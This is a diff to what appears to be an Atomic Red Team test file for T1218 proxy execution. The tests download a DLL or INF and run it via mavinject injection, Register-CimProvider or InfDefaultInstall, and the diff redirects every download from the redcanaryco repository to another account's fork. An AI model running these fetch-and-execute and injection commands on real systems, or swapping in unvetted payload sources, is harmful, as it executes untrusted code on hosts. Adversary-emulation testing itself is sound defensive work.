@@ -24,7 +24,7 @@ atomic_tests:
       if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
   executor:
     command: |
       mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
@@ -64,7 +64,7 @@ atomic_tests:
       if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
   executor:
     command: |
       C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
@@ -90,7 +90,7 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       InfDefaultInstall.exe #{inf_to_execute}
